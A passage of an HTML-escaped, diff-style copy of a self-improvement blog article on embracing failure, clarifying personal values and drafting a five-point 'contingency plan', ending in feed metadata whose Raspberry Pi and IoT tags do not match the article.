+&lt;img data-width=&quot;4000&quot; data-height=&quot;250&quot; src=&quot;https://cdn-images-1.medium.com/max/800/1*75f3FyFy5_WnAC4joYEXJQ.png&quot; /&gt;  
+&lt;/figure&gt;
+
+&lt;h4 id=&quot;focusing-on-only-the-important-stuff-is-the-most-valuable-thing-you-can-do-for-yourself&quot;&gt;Focusing on only the important stuff is the most valuable thing you can do for yourself.&lt;/h4&gt;
+
+&lt;p&gt;&lt;b&gt;&lt;em&gt;Summary:&lt;/em&gt;&lt;/b&gt; &lt;em&gt;This article details why failure is a powerful tool for reflection, and necessary part of life. It then goes on to outline a powerful method to plan for future success by cutting out anything that isn’t essential to your own values.&lt;/em&gt;&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;figure&gt;
+
+&lt;img data-width=&quot;1291&quot; data-height=&quot;479&quot; src=&quot;https://cdn-images-1.medium.com/max/800/1*MU3-ZkfLrUMy6BoG7vhnZA.png&quot; /&gt;  
+&lt;/figure&gt;
+
+&lt;p&gt;&lt;b&gt;That’s why failure is so vital&lt;/b&gt; — it means that you’re going in the right direction. Having a challenge creates a sense of urgency — a fire underneath your ass that pushes you to actually get things done. If you’re constantly comfortable in life, then you aren’t pushing yourself. You’re a plateau on the verge of decline. A lot of intelligent people would say that failure is a needed stepping stone on the path towards success — but I would disagree. They’re more like positive and negative currents of energy — both being equally needed and powerful.&lt;/p&gt;
+
+&lt;p&gt;I have had a lot of failures in life. I’ve made a lot of mistakes that I regret. But all of those actions and consequences have lead me exactly where I am today — with my words in front of your eyes. That’s a powerful thing.&lt;/p&gt;
+
+&lt;p&gt;That’s why I realize I need to try harder. I need to take larger risks and allow myself to be more open and vulnerable. I need to look beyond the day-to-day regime that I have in place. Getting serious not only means potentially profound failure — it also means finding and creating deeper and more meaningful purpose. With this article, I’m taking a step back to just sit and think. To adjust what I’m doing and revise who I am — and with the new year just around the corner, I think there’s no better time.&lt;/p&gt;
+
+&lt;figure&gt;
+
+&lt;img data-width=&quot;1400&quot; data-height=&quot;62&quot; src=&quot;https://cdn-images-1.medium.com/max/800/1*A1HXExeRru-asgR6_gN4Sw.png&quot; /&gt;  
+&lt;/figure&gt;
+
+&lt;h3 id=&quot;creating-a-focalpoint&quot;&gt;&lt;b&gt;Creating a Focal Point&lt;/b&gt;&lt;/h3&gt;
+
+&lt;p&gt;Back to the question I had on-hand: &lt;b&gt;Why do people fail to keep promises they make to themselves?&lt;/b&gt; Sure, I made a compelling argument to the importance of failing at times, but success &lt;em&gt;is&lt;/em&gt; endgame. Human psychology is a murky field still in its infancy, and there are a multitude of reasons why people say one thing then do another. We all have obligations and responsibilities — things that take our time and effort away from what we set out to do idealistically. As a self-improvement junkie, I’ve come across a lot of different answers to this question, and subsequent solutions. In this article, I’d like to contribute my own solution — write yourself a contingency plan.&lt;/p&gt;
+
+&lt;p&gt;What is a contingency plan? It’s defined as: &lt;em&gt;A plan designed to take a possible future event or circumstance into account&lt;/em&gt;. As in, planning for the worst-case scenarios which, according to Murphy’s Law, &lt;em&gt;are&lt;/em&gt; going to happen. Nobody else is going to help you figuring out a way to stay standing when everything else begins to fall apart. There’s no inherent manual for sticking to your goals when your willpower begins to fade.&lt;/p&gt;
+
+&lt;figure&gt;
+
+&lt;img data-width=&quot;2400&quot; data-height=&quot;1514&quot; src=&quot;https://cdn-images-1.medium.com/max/600/1*GO5EtoAdbj4MMIoP7D76Lw.png&quot; /&gt;  
+&lt;/figure&gt;
+
+&lt;p&gt;After reading a lot of literature on the subject, I’ve boiled down what would make a good personal contingency plan into a single sentence: &lt;b&gt;Create a focal point for yourself.&lt;/b&gt; What does that mean? It means: &lt;br /&gt;
+&lt;b&gt;1)&lt;/b&gt; Figure out your values. &lt;br /&gt;
+&lt;b&gt;2)** Make them your first priority. **3)&lt;/b&gt; Cut the rest of the bullshit out of your life. &lt;br /&gt;
+The human mind is an amazingly capable machine, but with so much stimuli, it is spread far too thin. If you were to write out a list of each unique thing you did today — let alone today–you would have dozens of different tasks that require both willpower and brain-power.&lt;/p&gt;
+
+&lt;p&gt;We all have more choices and information in front of us than ever before in human history. It’s far too easy to use the technology and potential knowledge available to us in an unhealthy and unproductive way. There’s an emerging trend of &lt;em&gt;digital detox&lt;/em&gt;, the act of cutting out social media and the internet as a whole from your life. I believe there is merit to this. We all could value from taking some time to sincerely just &lt;em&gt;sit and think.&lt;/em&gt; To hear your own voice instead of being bombarded with the thousands of the online.&lt;/p&gt;
+
+&lt;h4 id=&quot;finding-yourvalues&quot;&gt;Finding Your Values&lt;/h4&gt;
+
+&lt;p&gt;From our own voice, we can hear our own values. What we truly deem as important — not to others — but to just ourselves. How do you do this in practice? Here’s what I suggest:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;b&gt;Clear Your Desk.&lt;/b&gt; Place things elsewhere for a period of time in order to have an empty, workable table.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;b&gt;Airplane Mode.&lt;/b&gt; All devices — even better if they’re put in another room.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;b&gt;Start a timer for 30 min.&lt;/b&gt; Even longer, if you think you’re capable.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;b&gt;Sit and Think.&lt;/b&gt; Trap yourself with just a pen and paper.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;This is a similar process to free-writing as a &lt;a href=&quot;https://betterhumans.coach.me/better-than-meditation-12532d29f6cd&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;meditation&lt;/a&gt;, or a &lt;a href=&quot;https://betterhumans.coach.me/better-than-meditation-12532d29f6cd&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;mind dump&lt;/a&gt;, which I think is an additional important activity to do from time to time. However, this isn’t about figuring out what needs to be done in the next week or month. It’s deeper than that.&lt;/p&gt;
+
+&lt;p&gt;It’s about writing your &lt;b&gt;mission statement — &lt;/b&gt;which I’ll cover in more depth in an upcoming post. &lt;a href=&quot;https://jamesclear.com/buffett-focus&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Warren Buffet has an infamous exercise&lt;/a&gt;, listing the twenty-five things you want to do in life — then cross off everything except the top five. This is what I mean by your focal point — figuring out what you truly want to do — and then figuring out how to do start doing it while cutting out everything else without mercy. Every field of dreams needs a lawnmower.&lt;/p&gt;
+
+&lt;p&gt;In order to create ambitious goals and succeed at them, you need to think beyond 2018. It’s about the next five years — it’s about the rest of your life. Having a purpose — a deep-rooted &lt;b&gt;&lt;em&gt;why&lt;/em&gt;&lt;/b&gt;_ — _connected to the actions you take daily makes it more difficult for you to give up and easier for you to follow-through. It also makes it easier to start again after a failure. This is how to keep the promises that you make to yourself.&lt;/p&gt;
+
+&lt;figure&gt;
+
+&lt;img data-width=&quot;1400&quot; data-height=&quot;62&quot; src=&quot;https://cdn-images-1.medium.com/max/800/1*A1HXExeRru-asgR6_gN4Sw.png&quot; /&gt;  
+&lt;/figure&gt;
+
+&lt;h3 id=&quot;my-contingency-plan&quot;&gt;&lt;b&gt;My Contingency Plan&lt;/b&gt;&lt;/h3&gt;
+
+&lt;p&gt;As per usual, I enjoy displaying how I personally use the information that I find myself writing about for others. Unlike a lot of other how-to columnists out there, I don’t try to compartmentalize my life from the advice I share. If you are to eat your own dog-food, or in other words, actually set out on the actionable and difficult tasks you preach, then there is a far greater depth to the authenticity that is displayed. With all that being said, here’s what I have devised for my own contingency plan:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;b&gt;Do Good Research.&lt;/b&gt; Before anything else, I need to learn and educate myself on important and complex topics. I believe this is important for both making better sense of the chaotic world I live in, as well as synthesizing a broad range of material into my own work, like this article. The most important thing to learn is &lt;em&gt;how to learn well,&lt;/em&gt; which again, I’ll be covering in a later post.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;b&gt;Create Value for Others.&lt;/b&gt; There is an overwhelming amount of content being created constantly — most of it being taken for granted by the masses. In order to wade through all the noise, there are those that try to market themselves strategically. While there’s nothing wrong with that, no amount of good marketing can replace going through the effort of creating original and valuable work for people. More than that, though, I’m focused on keeping &lt;em&gt;value above the fold.&lt;/em&gt; In other words, have the most important information at the beginning, instead of hiding it away and only giving it away in exchange for personal information, such as an e-mail address.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;b&gt;Stick to a Single Task.&lt;/b&gt; Due to the overwhelming amount of content being created constantly, it’s easier than ever to never truly focus on a single thing for a long stretch of time. And by &lt;em&gt;truly&lt;/em&gt; focus, I mean not stopping every ten minutes to check something else. Putting your nose to the grindstone means absolutely everything else is put on the back-burner, at least for an hour.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;b&gt;Reach Out.&lt;/b&gt; A lot of people view writing as a solitary craft — and it is. But even then, community is everything. The entire idea of Medium is to have an established community of talented people that create good work that deserves discussion and feedback. Having others hold you accountable is far more powerful than trying to hold yourself accountable.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;b&gt;Cut the Bullshit.&lt;/b&gt; If I come across something that doesn’t fit in the above four actions, I won’t bother with it. &lt;a href=&quot;https://medium.com/@brennanbrown/our-finite-everything-8ed4d9d70a2f&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Days are too short to let time be wasted.&lt;/a&gt; Attention is too limited and finite to allow for meaningless distractions. The human body is too complex and incredible to allow unhealthy foods or lack of physical activity to occur. Each moment, I need to be mindful of what I’m doing, and if I’m pushing myself towards my goals or pulling myself further away from them.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure&gt;
+
+&lt;img data-width=&quot;1400&quot; data-height=&quot;62&quot; src=&quot;https://cdn-images-1.medium.com/max/800/1*A1HXExeRru-asgR6_gN4Sw.png&quot; /&gt;  
+&lt;/figure&gt;
+
+&lt;h4 id=&quot;summary&quot;&gt;SUMMARY:&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;b&gt;Embrace Failure.&lt;/b&gt; Recognize the importance of the path that mistakes and regrets have put you on, and the lessons you’ve been taught. More importantly, allow yourself to be vulnerable enough to walk into challenges where failure is bound to happen.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;b&gt;Have a Plan.&lt;/b&gt; Take a step back from the busywork of the daily schedule and truly think about what you would enjoy doing in the long-term, and figure out how to achieve that. Going a step further, figure out the obstacles in your way and determine how to achieve what you want even amidst a worst-case scenario. This is a personal contingency plan done right.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;b&gt;&lt;em&gt;Credit:&lt;/em&gt;&lt;/b&gt; &lt;em&gt;Hand-drawn Text Ornaments are&lt;/em&gt; &lt;a href=&quot;https://www.freepik.com/index.php?goto=74&amp;amp;idfoto=1256497&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;&lt;em&gt;Designs by Freepik&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;wp-caption&quot;&gt;
+
+&lt;img data-width=&quot;2400&quot; data-height=&quot;1800&quot; src=&quot;https://cdn-images-1.medium.com/max/800/1*pRon9UAtEO-JzTY-7mg1jA.png&quot; /&gt;&lt;figcaption class=&quot;wp-caption-text&quot;&gt;&lt;b&gt;Thanks for Reading!&lt;/b&gt;&lt;/figcaption&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;wp-caption&quot;&gt;
+
+&lt;a href=&quot;https://writingcooperative.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;&lt;img data-width=&quot;1099&quot; data-height=&quot;139&quot; src=&quot;https://cdn-images-1.medium.com/max/800/1*eLY7z6NuxjwFyI1T-dwXcQ.png&quot; /&gt;&lt;/a&gt;&lt;figcaption class=&quot;wp-caption-text&quot;&gt;Helping each other write better.&lt;/figcaption&gt;&lt;/figure&gt;</content><author><name>Giovanni De Costanzo</name></author><category term="Guides" /><category term="InternetofThings" /><category term="IoT" /><category term="piface" /><category term="piface digital 2" /><category term="pifaceio" /><category term="Programmazione" /><category term="Python" /><category term="raspberry" /><category term="raspberrypi" /><summary type="html"></summary></entry></feed>
